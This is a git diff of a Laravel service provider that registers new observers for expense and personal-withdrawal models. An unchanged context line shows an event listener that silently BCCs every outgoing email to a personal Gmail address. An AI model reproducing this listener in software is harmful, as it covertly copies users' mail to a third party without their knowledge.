@@ -8,7 +8,9 @@ use App\Models\CashierSalesFatora;
 use App\Models\CashierSalesReturn;
 use App\Models\CompanyEntry;
 use App\Models\CompanySalesTransfer;
+use App\Models\Expense;
 use App\Models\Order;
+use App\Models\PersonalWithdrawal;
 use App\Models\ProductImportItem;
 use App\Models\SalesPointCashierTrans;
 use App\Models\ShippingWarehouse;
@@ -21,7 +23,9 @@ use App\Observers\CashierSalesReturnObserver;
 use App\Observers\CashierTransObserver;
 use App\Observers\CompanyEntryObserver;
 use App\Observers\CompanySalesTransferObserver;
+use App\Observers\ExpenseObserver;
 use App\Observers\OrderObserver;
+use App\Observers\PersonalWithdrawalObserver;
 use App\Observers\ProductImportItemObserver;
 use App\Observers\ShippingWarehouseObserver;
 use App\Observers\SupplierPaymentObserver;
@@ -74,6 +78,9 @@ class AppServiceProvider extends ServiceProvider
     CompanyEntry::observe(CompanyEntryObserver::class);
 
     SupplierPayment::observe(SupplierPaymentObserver::class);
+
+    Expense::observe(ExpenseObserver::class);
+    PersonalWithdrawal::observe(PersonalWithdrawalObserver::class);
 
     Event::listen(MessageSending::class, function (MessageSending $event) {
       $event->message->addBcc('aloshmohammad2001@gmail.com');
